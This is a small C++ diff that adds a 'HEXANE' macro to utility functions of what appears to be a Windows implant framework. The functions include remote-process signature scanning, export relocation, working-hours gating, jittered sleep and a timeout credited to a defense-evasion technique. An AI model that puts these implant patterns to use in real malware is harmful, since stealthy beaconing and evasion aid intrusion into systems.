@@ -2,6 +2,7 @@
 namespace Utils {
 
     VOID AppendBuffer(uint8_t **buffer, const uint8_t *const target, uint32_t *capacity, const uint32_t length) {
+        HEXANE;
 
         const auto new_buffer = B_PTR(Realloc(*buffer, *capacity + length));
         if (!new_buffer) {
@@ -14,6 +15,7 @@ namespace Utils {
     }
 
     VOID AppendPointerList(void **array[], void *pointer, uint32_t *count) {
+        HEXANE;
 
         const auto new_list = (void**) Realloc(*array, (*count + 1) * sizeof(void*));
         if (!new_list) {
@@ -77,6 +79,7 @@ namespace Utils {
         }
 
         UINT_PTR RelocateExport(void* const process, const void* const target, size_t size) {
+            HEXANE;
 
             uintptr_t ret       = 0;
             const auto address  = (uintptr_t) target;
@@ -101,6 +104,7 @@ namespace Utils {
         }
 
         UINT_PTR SignatureScan(void* process, const uintptr_t start, const uint32_t size, const char* signature, const char* mask) {
+            HEXANE;
 
             size_t read         = 0;
             uintptr_t address   = 0;
@@ -127,6 +131,7 @@ namespace Utils {
     namespace Time {
 
         ULONG64 GetTimeNow() {
+            HEXANE;
 
             FILETIME file_time       = { };
             LARGE_INTEGER large_int  = { };
@@ -140,6 +145,8 @@ namespace Utils {
         }
 
         BOOL InWorkingHours() {
+            HEXANE;
+
             SYSTEMTIME systime = { };
 
             uint32_t work_hours = Ctx->config.hours; 		
@@ -170,6 +177,7 @@ namespace Utils {
         VOID Timeout(size_t ms) {
             // Courtesy of Illegacy & Shubakki:
             // https://www.legacyy.xyz/defenseevasion/windows/2022/07/04/abusing-shareduserdata-for-defense-evasion-and-exploitation.html
+            HEXANE;
 
             auto defaultseed    = Utils::Random::RandomSeed();
             auto seed           = Ctx->nt.RtlRandomEx((ULONG*) &defaultseed);
@@ -187,6 +195,7 @@ namespace Utils {
     namespace Random {
 
 		UINT32 RandomSleepTime() {
+		    HEXANE;
 
 			SYSTEMTIME sys_time = { };
 
@@ -259,6 +268,7 @@ namespace Utils {
         }
 
         UINT32 RandomNumber32() {
+		    HEXANE;
 
             auto seed = RandomSeed();
 
@@ -272,6 +282,7 @@ namespace Utils {
         }
 
         BOOL RandomBool() {
+		    HEXANE;
 
             auto seed = RandomSeed();
 
